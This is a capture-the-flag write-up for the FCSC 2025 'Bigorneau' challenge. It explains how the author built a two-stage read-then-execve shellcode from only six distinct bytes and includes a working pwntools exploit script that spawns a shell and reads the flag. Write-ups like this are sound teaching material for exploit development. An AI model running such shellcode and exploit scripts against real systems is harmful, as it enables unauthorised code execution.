+++
title = "FCSC 2025 | Bigorneau"
+++


## Checksecs
```
[*] '/home/botman/Documents/challenges/FCSC/bigorneau/bigorneau'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## TL;DR
Constraints: 6 different bytes

Solution:
- Simple read shellcode into the stack
- Use only push/pop instructions to fill `rsi`/`rdx`
- Fill `rdx` using bytes already present in the shellcode

## Writeup

This challenge was fairly easy. The only constraint for our shellcode was to use **only 6 different bytes**. Instead of using a classical `execve` shellcode, I developed a simple shellcode with a `read` syscall that allowed me to write onto the stack and then execute the real `execve` shellcode.

I started with a "normal" shellcode, which looked like this:
```asm
push rsp
mov rsi, rsp
mov rdx, shellcode_len
syscall
```

> <span style="color:#316dca">**ⓘ NOTES**</span>
>
> As you can see, I only set `rsi` and `rdx`, as `rax` was already `0x0` ([read syscall](https://x64.syscall.sh/)) thanks to the preface added by `bigorneau.py`.

Since the objective was to use as few different bytes as possible, I removed all the `mov` instructions (which have large opcodes) and replaced them with `push`/`pop` instructions:
```asm
push rsp
push rsp
pop rsi
push shellcode_len
pop rdx
syscall
```

<div style="page-break-after: always;"></div>

At this point, it was almost done. The only problem was the `shellcode_len` value. I replaced it with values already present in the shellcode to avoid introducing new bytes, obtaining:
```asm
push rsp
push rsp
pop rsi
push 0x0f050f05
pop rdx
syscall
```

> <span style="color:#316dca">**ⓘ NOTES**</span>
>
> If I had pushed `0x100` onto the stack, the shellcode would have looked like `0x54545e68000100005a0f05`, introducing two extra bytes `0x0` and `0x1`. By reusing the existing `0xf` and `0x5` bytes, I wrote `push 0x0f050f05`, resulting in the shellcode `0x54545e68050f050f5a0f05`.

Finally, I wrote a small script to send the first-stage shellcode followed by the real `execve` shellcode with a little padding to reach `rip` and boom, pwned:

```python
from pwn import *

CHALL = "bigorneau.py"

def exploit(io, elf):
    context.update(arch='x86_64')
    shellcode = '''
    push rsp
    push rsp
    pop rsi
    push 0x0f050f05
    pop rdx
    syscall
    '''
    shellcode = bytes(asm(shellcode))

    io.info('shellcode: ' + hex(int.from_bytes(shellcode)))
    io.info('set: %s : %i' % (', '.join([hex(i) for i in set(shellcode)]), len(set(shellcode))))

    io.sendlineafter(b':\n', hex(int.from_bytes(shellcode))[2:].encode())
    io.sendline(b'A'*104 + bytes(asm(shellcraft.sh())))
    io.sendline(b'cat flag.txt')
    flag = io.recvline().decode()
    return flag
```

[download here](/exploits/bigorneau.py)

**Written by *0xB0tm4n***
